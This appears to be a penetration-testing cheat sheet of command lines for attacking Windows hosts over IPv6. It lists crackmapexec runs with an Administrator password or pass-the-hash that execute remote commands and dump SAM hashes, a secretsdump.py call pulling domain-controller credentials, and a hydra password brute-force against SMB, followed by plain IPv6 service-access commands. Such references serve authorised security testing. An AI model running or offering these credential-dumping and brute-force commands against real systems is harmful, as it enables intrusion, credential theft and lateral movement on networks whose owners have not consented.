### IPv6 Assessment
| for Example  |
| ------------- |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210-u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -H "Hash" -x "hostname"|
|python secretsdump.py -hashes "Hash" -just-dc acmebank.loca/Administrator@2001:DB8:7654:3210:FEDC:BA98:7654:3210 |
|crackmapexec 2001:DB8:7654:3210:FEDC:BA98:7654:3210 -u Administrator -p 'Passw0rd' -x "ipconfig" |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |
|crackmapexec cme-hosts.txt -u Administrator -H "Hash" --sam |

### IPv6 hydra Password Brute Force
| for Example  |
| ------------- |
|hydra -l Administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 smb://[IPv6] |

### IPv6 Services
| for Example  |
| ------------- |
|ssh MeMe@fe80::ea9a:8fff:fe67:190d%eth0 |
|smbclient -L //2001:db7::1234:1%eth0 |
|http://[2001:db7::1234:2] |
|telnet 3ffe:400:100::1 80 |
|mount -t nfs [2001:db8::60fe:5bff:febc:912]:/home/MeMe /home/mount/ |
|curl -g [fe80::ba27:ebff:fe60:89af] |
|curl -g [::1]:8080|
|curl -g http://[::1]:8080/ |
|curl -I [2001:db7::1234:1] -v -V -K|
|dirb http://[2001:db7::1234:1]|

